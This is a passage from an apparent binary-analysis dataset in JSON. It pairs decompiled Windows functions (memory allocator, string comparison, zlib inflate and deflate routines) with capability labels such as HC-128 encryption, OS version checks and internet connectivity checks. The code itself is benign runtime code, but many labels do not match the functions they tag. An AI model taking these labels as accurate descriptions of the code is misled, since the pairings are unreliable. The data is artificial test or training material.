{\n                    sub.kernel32.dll_Sleep();\n                    LOCK();\n                    bVar19 = *0x496718 == 0;\n                    *0x496718 = *0x496718 ^ bVar19 * (*0x496718 ^ 1);\n                    if (bVar19) break;\n                    sub.kernel32.dll_Sleep();\n                }\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x496728);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x496724;\n            if (uVar15 == 0) {\n                if (*0x496720 < uVar18) {\n                    ppuVar10 = fcn.004016f8();\n                }\n                else {\n                    ppuVar10 = *0x49671c - uVar18;\n                    *0x49671c = ppuVar10;\n                    *0x496720 = *0x496720 - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x496718 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x496728);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | uVar12;\n        }\n        iVar13 = uVar12 * 8;\n        ppuVar10 = *(iVar13 + 0x4967ac);\n        piVar1 = ppuVar10[1];\n        *(iVar13 + 0x4967ac) = piVar1;\n        *piVar1 = iVar13 + 0x4967a8;\n        if (iVar13 + 0x4967a8 == piVar1) {\n            uVar7 = uVar12 & 0x1f;\n            puVar4 = uVar14 * 4 + 0x496728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar14 >> 3) + 0x496724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar14 & 7));\n            }\n        }\n        uVar15 = (ppuVar10[-1] & 0xfffffff0) - uVar18;\n        if (uVar15 == 0) {\n            puVar3 = ((ppuVar10[-1] & 0xfffffff0) - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            *(ppuVar10 + uVar17 + 0x2c) = uVar15 + 3;\n            *(ppuVar10 + (uVar15 - 8) + uVar18) = uVar15;\n            if (0xb2f < uVar15) {\n                fcn.0040162c();\n            }\n        }\n        ppuVar10[-1] = uVar17 + 0x32;\n        *0x496718 = 0;\n        return ppuVar10;\n    }\n    iVar13 = *((in_EAX + 3 >> 3) + 0x4965c0) * 8;\n    puVar3 = iVar13 + 0x49204c;\n    puVar16 = puVar3;\n    if (*0x49604d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar7 = *puVar3;\n            *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n            puVar16 = puVar3;\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x49206c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            puVar16 = iVar13 + 0x49208c;\n            LOCK();\n            uVar7 = *puVar16;\n            *puVar16 = *puVar16 ^ (uVar7 == 0) * (*puVar16 ^ 1);\n            if (uVar7 == 0) break;\n            if (*0x4965b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                LOCK();\n                uVar7 = *puVar3;\n                *puVar3 = *puVar3 ^ (uVar7 == 0) * (*puVar3 ^ 1);\n                puVar16 = puVar3;\n                if (uVar7 == 0) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    puVar3 = *(puVar16 + 4);\n    ppuVar10 = *(puVar3 + 8);\n    if (puVar3 != puVar16) {\n        *(puVar3 + 0xc) = *(puVar3 + 0xc) + 1;\n        puVar6 = ppuVar10[-1];\n        *(puVar3 + 8) = puVar6 & 0xfffffff8;\n        ppuVar10[-1] = puVar3;\n        if ((puVar6 & 0xfffffff8) != 0) {\n            *puVar16 = 0;\n            return ppuVar10;\n        }\n        iVar13 = *(puVar3 + 4);\n        *(iVar13 + 0x14) = puVar16;\n        *(puVar16 + 4) = iVar13;\n        *puVar16 = 0;\n        return ppuVar10;\n    }\n    puVar3 = *(puVar16 + 0x10);\n    uVar5 = *(puVar16 + 2);\n    if (ppuVar10 < *(puVar16 + 0xc) || ppuVar10 == *(puVar16 + 0xc)) {\n        piVar1 = puVar3 + 0xc;\n        *piVar1 = *piVar1 + 1;\n        *(puVar16 + 8) = uVar5 + ppuVar10;\n        *puVar16 = 0;\n        ppuVar10[-1] = puVar3;\n        return ppuVar10;\n    }\n    if (*0x49604d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar19 = *0x496718 == 0;\n            *0x496718 = *0x496718 ^ bVar19 * (*0x496718 ^ 1);\n            if (bVar19) break;\n            if (*0x4965b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x496718 == 0;\n                *0x496718 = *0x496718 ^ bVar19 * (*0x496718 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    uVar17 = puVar16[1] & *0x496724;\n    if (uVar17 == 0) {\n        if (*0x496720 < *(puVar16 + 0x18)) {\n            uVar17 = *(puVar16 + 0x1a);\n            ppuVar10 = fcn.004016f8();\n            if (ppuVar10 == NULL) {\n                *0x496718 = 0;\n                *puVar16 = 0;\n                return NULL;\n            }\n        }\n        else {\n            uVar17 = *0x496720;\n            if (*(puVar16 + 0x1a) + 0xb30 <= *0x496720) {\n                uVar17 = *(puVar16 + 0x1a);\n            }\n            ppuVar10 = *0x49671c - uVar17;\n            *0x496720 = *0x496720 - uVar17;\n            *0x49671c = ppuVar10;\n        }\n    }\n    else {\n        uVar18 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> uVar18 & 1) == 0; uVar18 = uVar18 + 1) {\n            }\n        }\n        uVar17 = *(uVar18 * 4 + 0x496728);\n        iVar13 = 0;\n        if (uVar17 != 0) {\n            for (; (uVar17 >> iVar13 & 1) == 0; iVar13 = iVar13 + 1) {\n            }\n        }\n        iVar13 = iVar13 + uVar18 * 0x20;\n        iVar2 = iVar13 * 8;\n        ppuVar10 = *(iVar2 + 0x4967ac);\n        piVar1 = ppuVar10[1];\n        *(iVar2 + 0x4967ac) = piVar1;\n        *piVar1 = iVar2 + 0x4967a8;\n        if (iVar2 + 0x4967a8 == piVar1) {\n            uVar7 = iVar13 & 0x1f;\n            puVar4 = uVar18 * 4 + 0x496728;\n            *puVar4 = *puVar4 & (-2 << uVar7 | 0xfffffffeU >> 0x20 - uVar7);\n            if (*puVar4 == 0) {\n                puVar3 = (uVar18 >> 3) + 0x496724;\n                *puVar3 = *puVar3 & ~('\\x01' << (uVar18 & 7));\n            }\n        }\n        uVar17 = ppuVar10[-1] & 0xfffffff0;\n        if (uVar17 < 0x10a60) {\n            puVar3 = (uVar17 - 4) + ppuVar10;\n            *puVar3 = *puVar3 & 0xf7;\n        }\n        else {\n            uVar18 = *(puVar16 + 0x1a);\n            iVar13 = uVar17 - uVar18;\n            *(ppuVar10 + (uVar18 - 4)) = iVar13 + 3;\n            *(ppuVar10 + iVar13 + -8 + uVar18) = iVar13;\n            fcn.0040162c();\n            uVar17 = uVar18;\n        }\n    }\n    ppuVar10[-1] = uVar17 + 6;\n    *0x496718 = 0;\n    *ppuVar10 = puVar16;\n    ppuVar10[2] = NULL;\n    ppuVar10[3] = 0x1;\n    *(puVar16 + 0x10) = ppuVar10;\n    *(puVar16 + 8) = *(puVar16 + 2) + ppuVar10 + 8;\n    *(puVar16 + 0xc) = ppuVar10 + (uVar17 - *(puVar16 + 2));\n    *puVar16 = 0;\n    ppuVar10[7] = ppuVar10;\n    return ppuVar10 + 8;\n}\n",
        "token_count": 3303
    },
    "00402c98": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00402c98(void)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    iVar3 = 0;\n    puVar2 = 0x49204e;\n    uVar1 = 0;\n    do {\n        if ((*0x496706 == '\\0') || (uVar4 = uVar1,  (*puVar2 & 0xf) == 0)) {\n            uVar4 = *puVar2 >> 3;\n            for (; uVar1 < uVar4; uVar1 = uVar1 + 1) {\n                *(uVar1 + 0x4965c0) = iVar3 * '\\x04';\n            }\n        }\n        iVar3 = iVar3 + 1;\n        puVar2 = puVar2 + 0x10;\n        uVar1 = uVar4;\n    } while (iVar3 != 0x37);\n    return;\n}\n",
        "token_count": 222
    },
    "00405974": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00405974(uint param_1, char *param_2)\n\n{\n    uint32_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    \n    if (in_EAX != param_2) {\n        if ((in_EAX & param_2) == 0) {\n            if (in_EAX == NULL) {\n                return NULL;\n            }\n            if (param_2 == NULL) {\n                return in_EAX;\n            }\n        }\n        if (*in_EAX - *param_2 == 0) {\n            uVar5 = *(in_EAX + -4) - *(param_2 + -4);\n            iVar3 = (((*in_EAX - *param_2) - 1) + (*(in_EAX + -4) < *(param_2 + -4)) & uVar5) - *(in_EAX + -4);\n            uVar2 = in_EAX - iVar3;\n            iVar4 = iVar3;\n            while (uVar6 = *(iVar4 + uVar2) ^ *(param_2 + (iVar4 - iVar3)),  uVar6 == 0) {\n                iVar4 = iVar4 + 4;\n                if (-1 < iVar4) goto code_r0x004059a4;\n            }\n            uVar1 = 0;\n            if (uVar6 != 0) {\n                for (; (uVar6 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n                }\n            }\n            iVar4 = iVar4 + (uVar1 >> 3);\n            if (iVar4 < 0) {\n                return uVar2 & 0xffffff00 | *(iVar4 + uVar2);\n            }\ncode_r0x004059a4:\n            in_EAX = uVar5 * 2;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 448
    },
    "004098f4": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004098f4(uint param_1, uint8_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    if (in_EAX == param_2) {\n        return 0;\n    }\n    if ((in_EAX & param_2) == 0) {\n        if (in_EAX == NULL) {\n            return -*(param_2 + -4);\n        }\n        if (param_2 == NULL) {\n            return *(in_EAX + -4);\n        }\n    }\n    if (*param_2 != *in_EAX) {\n        return *in_EAX - *param_2;\n    }\n    uVar4 = *(in_EAX + -4) - *(param_2 + -4);\n    iVar2 = ((*(in_EAX + -4) < *(param_2 + -4)) - 1 & uVar4) - *(in_EAX + -4);\n    iVar3 = iVar2;\n    while (uVar5 = *(in_EAX + (iVar3 - iVar2)) ^ *(param_2 + (iVar3 - iVar2)),  uVar5 == 0) {\n        iVar3 = iVar3 + 4;\n        if (-1 < iVar3) {\n            return uVar4;\n        }\n    }\n    uVar1 = 0;\n    if (uVar5 != 0) {\n        for (; (uVar5 >> uVar1 & 1) == 0; uVar1 = uVar1 + 1) {\n        }\n    }\n    iVar3 = iVar3 + (uVar1 >> 3);\n    if (-1 < iVar3) {\n        return uVar4;\n    }\n    return in_EAX[iVar3 - iVar2] - param_2[iVar3 - iVar2];\n}\n",
        "token_count": 430
    },
    "00469364": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00469364(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    uint8_t **in_EAX;\n    uint8_t *puVar10;\n    uint32_t uVar11;\n    uint8_t *puVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    uint8_t *puVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint8_t *puStack72;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack16;\n    \n    puVar1 = in_EAX[7];\n    puStack72 = *in_EAX + -1;\n    puVar12 = in_EAX[1] + -5 + puStack72;\n    puVar17 = in_EAX[3] + -1;\n    iVar13 = puVar17 - (param_2 - in_EAX[4]);\n    puVar10 = in_EAX[4] + -0x101 + puVar17;\n    iVar2 = puVar1[9];\n    uVar3 = puVar1[10];\n    uVar4 = puVar1[0xb];\n    iVar14 = puVar1[0xc];\n    uStack40 = puVar1[0xd];\n    uStack36 = puVar1[0xe];\n    iVar5 = puVar1[0x12];\n    iVar6 = puVar1[0x13];\n    uVar7 = puVar1[0x14];\n    uVar8 = puVar1[0x15];\ncode_r0x00469432:\n    if (uStack36 < 0xf) {\n        puVar9 = puStack72 + 1;\n        puStack72 = puStack72 + 2;\n        uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n        uStack36 = uStack36 + 0x10;\n    }\n    uStack16 = *(iVar5 + (uStack40 & (1 << (uVar7 & 0x1f)) - 1U) * 4);\n    while( true ) {\n        uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n        uStack36 = uStack36 - uStack16._1_1_;\n        if ((uStack16 & 0xff) == 0) break;\n        if ((uStack16 & 0x10) != 0) {\n            uVar11 = uStack16._2_2_;\n            uVar19 = uStack16 & 0xf;\n            if ((uStack16 & 0xf) != 0) {\n                if (uStack36 < uVar19) {\n                    puStack72 = puStack72 + 1;\n                    uStack40 = uStack40 + (*puStack72 << (uStack36 & 0x1f));\n                    uStack36 = uStack36 + 8;\n                }\n                uVar11 = uVar11 + ((1 << uVar19) - 1U & uStack40);\n                uStack40 = uStack40 >> uVar19;\n                uStack36 = uStack36 - uVar19;\n            }\n            if (uStack36 < 0xf) {\n                puVar9 = puStack72 + 1;\n                puStack72 = puStack72 + 2;\n                uStack40 = uStack40 + (*puVar9 << (uStack36 & 0x1f)) + (*puStack72 << (uStack36 + 8 & 0x1f));\n                uStack36 = uStack36 + 0x10;\n            }\n            uStack16 = *(iVar6 + (uStack40 & (1 << (uVar8 & 0x1f)) - 1U) * 4);\n            goto code_r0x00469546;\n        }\n        if ((uStack16 & 0x40) != 0) {\n            if ((uStack16 & 0x20) == 0) {\n                in_EAX[6] = 0x493c08;\n                *puVar1 = 0x12;\n            }\n            else {\n                *puVar1 = 3;\n            }\n            goto code_r0x004697bb;\n        }\n        uStack16 = *(iVar5 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    }\n    puVar17[1] = uStack16._2_1_;\n    puVar17 = puVar17 + 1;\n    goto code_r0x004697a7;\ncode_r0x00469546:\n    uStack40 = uStack40 >> (uStack16._1_1_ & 0x1f);\n    uVar19 = uStack36 - uStack16._1_1_;\n    uStack36 = uVar19;\n    if ((uStack16 & 0x10) != 0) goto code_r0x00469566;\n    if ((uStack16 & 0x40) != 0) {\n        in_EAX[6] = 0x493bf2;\n        *puVar1 = 0x12;\n        goto code_r0x004697bb;\n    }\n    uStack16 = *(iVar6 + (((1 << (uStack16 & 0x1f)) - 1U & uStack40) + uStack16._2_2_) * 4);\n    goto code_r0x00469546;\ncode_r0x00469566:\n    uStack16 = uStack16 & 0xf;\n    puVar9 = puStack72;\n    if (uVar19 < uStack16) {\n        uStack40 = uStack40 + (puStack72[1] << (uVar19 & 0x1f));\n        uStack36 = uVar19 + 8;\n        puVar9 = puStack72 + 1;\n        if (uStack36 < uStack16) {\n            uStack40 = uStack40 + (puStack72[2] << (uStack36 & 0x1f));\n            uStack36 = uVar19 + 0x10;\n            puVar9 = puStack72 + 2;\n        }\n    }\n    puStack72 = puVar9;\n    uVar19 = (1 << uStack16) - 1U & uStack40;\n    uStack40 = uStack40 >> uStack16;\n    uStack36 = uStack36 - uStack16;\n    uVar20 = puVar17 - iVar13;\n    uVar19 = uStack16._2_2_ + uVar19;\n    if (uVar20 < uVar19) {\n        uVar20 = uVar19 - uVar20;\n        if (uVar3 < uVar20) {\n            in_EAX[6] = 0x493bd4;\n            *puVar1 = 0x12;\ncode_r0x004697bb:\n            puStack72 = puStack72 + -(uStack36 >> 3);\n            iVar2 = uStack36 - (uStack36 & 0xfffffff8);\n            *in_EAX = puStack72 + 1;\n            in_EAX[3] = puVar17 + 1;\n            if (puStack72 < puVar12) {\n                iVar14 = puVar12 - puStack72;\n            }\n            else {\n                iVar14 = -(puStack72 - puVar12);\n            }\n            in_EAX[1] = iVar14 + 5;\n            if (puVar17 < puVar10) {\n                iVar14 = puVar10 - puVar17;\n            }\n            else {\n                iVar14 = -(puVar17 - puVar10);\n            }\n            in_EAX[4] = iVar14 + 0x101;\n            puVar1[0xd] = uStack40 & (1 << (iVar2 & 0x1f)) - 1U;\n            puVar1[0xe] = iVar2;\n            return;\n        }\n        iVar15 = iVar14 + -1;\n        puVar9 = puVar17;\n        if (uVar4 == 0) {\n            puVar16 = iVar15 + (iVar2 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        else if (uVar4 < uVar20) {\n            puVar16 = iVar15 + ((iVar2 + uVar4) - uVar20);\n            uVar20 = uVar20 - uVar4;\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = iVar14 + -1;\n                puVar9 = puVar17;\n                if (uVar4 < uVar11) {\n                    uVar11 = uVar11 - uVar4;\n                    uVar20 = uVar4;\n                    do {\n                        puVar17 = puVar17 + 1;\n                        puVar16 = puVar16 + 1;\n                        *puVar17 = *puVar16;\n                        uVar20 = uVar20 - 1;\n                    } while (uVar20 != 0);\n                    puVar16 = puVar17 + -uVar19;\n                    puVar9 = puVar17;\n                }\n            }\n        }\n        else {\n            puVar16 = iVar15 + (uVar4 - uVar20);\n            if (uVar20 < uVar11) {\n                uVar11 = uVar11 - uVar20;\n                do {\n                    puVar17 = puVar17 + 1;\n                    puVar16 = puVar16 + 1;\n                    *puVar17 = *puVar16;\n                    uVar20 = uVar20 - 1;\n                } while (uVar20 != 0);\n                puVar16 = puVar17 + -uVar19;\n                puVar9 = puVar17;\n            }\n        }\n        for (; 2 < uVar11; uVar11 = uVar11 - 3) {\n            puVar17 = puVar16 + 2;\n            puVar9[1] = puVar16[1];\n            puVar16 = puVar16 + 3;\n            puVar9[2] = *puVar17;\n            puVar9[3] = *puVar16;\n            puVar9 = puVar9 + 3;\n        }\n        puVar17 = puVar9;\n        if (uVar11 != 0) {\n            puVar17 = puVar9 + 1;\n            *puVar17 = puVar16[1];\n            if (1 < uVar11) {\n                puVar17 = puVar9 + 2;\n                *puVar17 = puVar16[2];\n            }\n        }\n    }\n    else {\n        puVar9 = puVar17 + -uVar19;\n        do {\n            puVar18 = puVar17;\n            puVar16 = puVar9;\n            puVar18[1] = puVar16[1];\n            puVar18[2] = puVar16[2];\n            puVar17 = puVar18 + 3;\n            uVar11 = uVar11 - 3;\n            *puVar17 = puVar16[3];\n            puVar9 = puVar16 + 3;\n        } while (2 < uVar11);\n        if (uVar11 != 0) {\n            puVar17 = puVar18 + 4;\n            *puVar17 = puVar16[4];\n            if (1 < uVar11) {\n                puVar17 = puVar18 + 5;\n                *puVar17 = puVar16[5];\n            }\n        }\n    }\ncode_r0x004697a7:\n    if ((puVar12 <= puStack72) || (puVar10 <= puVar17)) goto code_r0x004697bb;\n    goto code_r0x00469432;\n}\n",
        "token_count": 2894
    },
    "0046c680": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c680(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (in_EAX[0x20] < 1) {\n        uVar2 = in_ECX + 5;\n        uVar3 = uVar2;\n    }\n    else {\n        if ((in_ECX != 0) && (*(*in_EAX + 0x2c) == 2)) {\n            fcn.0046ce18();\n        }\n        fcn.0046b5f8();\n        fcn.0046b5f8();\n        var_8h = fcn.0046bf9c();\n        uVar2 = in_EAX[0x5a9] + 10U >> 3;\n        uVar3 = in_EAX[0x5aa] + 10U >> 3;\n        if (uVar3 <= uVar2) {\n            uVar2 = uVar3;\n        }\n    }\n    if ((uVar2 < in_ECX + 4U) || (in_EDX == 0)) {\n        if ((in_EAX[0x21] == 4) || (uVar2 == uVar3)) {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 2U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 2U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046c958();\n        }\n        else {\n            if (in_EAX[0x5ae] < 0xe) {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4 << (in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + 3;\n            }\n            else {\n                *(in_EAX + 0x5ad) = *(in_EAX + 0x5ad) | arg_8h + 4U << (in_EAX[0x5ae] & 0x1f);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad);\n                iVar1 = in_EAX[5];\n                in_EAX[5] = in_EAX[5] + 1;\n                *(in_EAX[2] + iVar1) = *(in_EAX + 0x5ad) >> 8;\n                *(in_EAX + 0x5ad) = (arg_8h + 4U & 0xffff) >> (0x10U - in_EAX[0x5ae] & 0x1f);\n                in_EAX[0x5ae] = in_EAX[0x5ae] + -0xd;\n            }\n            fcn.0046c000(var_8h + 1);\n            fcn.0046c958();\n        }\n    }\n    else {\n        fcn.0046c2f8(arg_8h);\n    }\n    fcn.0046b228();\n    if (arg_8h != 0) {\n        fcn.0046cef4();\n    }\n    return;\n}\n",
        "token_count": 1098
    },
    "00401770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401770(void)\n\n{\n    char cVar1;\n    \n    if (*0x49604d != '\\0') {\n        while (cVar1 = fcn.00401460(),  cVar1 != '\\0') {\n            if (*0x4965b5 == '\\0') {\n                sub.kernel32.dll_Sleep(0);\n                cVar1 = fcn.00401460();\n                if (cVar1 == '\\0') {\n                    return;\n                }\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "004022f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004022f4(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if (((*0x496720 != 0) && (in_EAX <= *0x49671c)) && (*0x49671c <= in_EAX + 0x13fff0)) {\n        uVar1 = *0x49671c;\n        if (*0x496720 == 0x13ffe0) {\n            uVar1 = 0;\n        }\n        return uVar1;\n    }\n    return in_EAX + 0x10;\n}\n",
        "token_count": 134
    },
    "004025c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.004025c8(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x49604d != '\\0') {\n        while (in_EAX = fcn.00401460(),  in_EAX != '\\0') {\n            if (*0x4965b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                in_EAX = fcn.00401460();\n                if (in_EAX == '\\0') break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if (*0x4987bc == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4987bc = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4987bc != 0;\n}\n",
        "token_count": 198
    },
    "0040267c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040267c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4987bc != NULL) {\n        cVar1 = fcn.004025c8();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4987bc;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4987bc)[iVar2 + 1]) {\n                        (*0x4987bc)[iVar2 + 1] = (*0x4987bc)[**0x4987bc];\n                        **0x4987bc = **0x4987bc + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4987c0 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 260
    },
    "00402cdc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402cdc(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = 0x37;\n    ppcVar3 = 0x492068;\n    do {\n        if (*ppcVar3 == NULL) {\n            *ppcVar3 = fcn.004015a0;\n        }\n        ppcVar3[-2] = ppcVar3 + -7;\n        ppcVar3[-6] = ppcVar3 + -7;\n        ppcVar3[-4] = NULL;\n        ppcVar3[-5] = 0x1;\n        uVar2 = (*(ppcVar3 + -0x1a) * 0xc + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0xb30) {\n            uVar2 = 0xb30;\n        }\n        uVar2 = uVar2 + 0x4d0 >> 0xd;\n        if (7 < uVar2) {\n            uVar2 = 7;\n        }\n        *(ppcVar3 + -0x1b) = -1 << (uVar2 & 0x1f);\n        *(ppcVar3 + -1) = (uVar2 << 0xd) + 0xb30;\n        uVar1 = *(ppcVar3 + -0x1a);\n        uVar2 = (uVar1 * 0x30 + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0x7330) {\n            uVar2 = 0x7330;\n        }\n        if (0xff30 < uVar2) {\n            uVar2 = 0xff30;\n        }\n        *(ppcVar3 + -2) = (((uVar2 - 0x20) / uVar1) * uVar1 + 0xef & 0xff00) + 0x30;\n        ppcVar3 = ppcVar3 + 8;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.00402c98();\n    *0x496708 = 0x496708;\n    *0x49670c = 0x496708;\n    iVar5 = 0x400;\n    iVar4 = 